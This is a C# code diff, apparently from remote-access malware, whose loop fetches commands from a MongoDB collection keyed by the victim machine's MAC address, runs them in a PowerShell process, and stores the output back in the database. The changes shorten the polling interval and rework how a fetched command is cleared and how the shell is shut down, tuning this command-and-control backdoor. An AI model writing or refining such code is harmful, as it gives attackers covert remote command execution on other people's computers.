@@ -58,7 +58,7 @@ namespace ProcessAsyncStreamSamples
                             powershell.Close();
                             break;
                         }
-                        Thread.Sleep(10000);
+                        Thread.Sleep(3000);
                         if (String.IsNullOrEmpty(sendOutput.ToString()))
                         {
                             doc.Add(new BsonElement("respond", "ur command havent any output"));
@@ -93,28 +93,17 @@ namespace ProcessAsyncStreamSamples
                         var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                         var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
                         var servercommand = commadscollection.Find(filter).FirstOrDefault();
-                        try
-                        {
-                            inputText = servercommand.ElementAt(2).Value.ToString();
-                            var update = Builders<BsonDocument>.Update.Set("command", "");
-                            commadscollection.UpdateOne(filter, update);
-                            if (inputText == "")
-                            {
-                                StreamWriter.Close();
-                                powershell.Kill();
-                                powershell.Close();
-                                inputText = null;
-                                break;
-                            }
-                        }
-                        catch
+                        inputText = servercommand.ElementAt(2).Value.ToString();
+                        var update = Builders<BsonDocument>.Update.Set("command", "");
+                        commadscollection.UpdateOne(filter, update);
+                        if (inputText == "")
                         {
                             StreamWriter.Close();
+                            powershell.Kill();
                             powershell.Close();
                             inputText = null;
                             break;
                         }
-
                     }
 
                 }
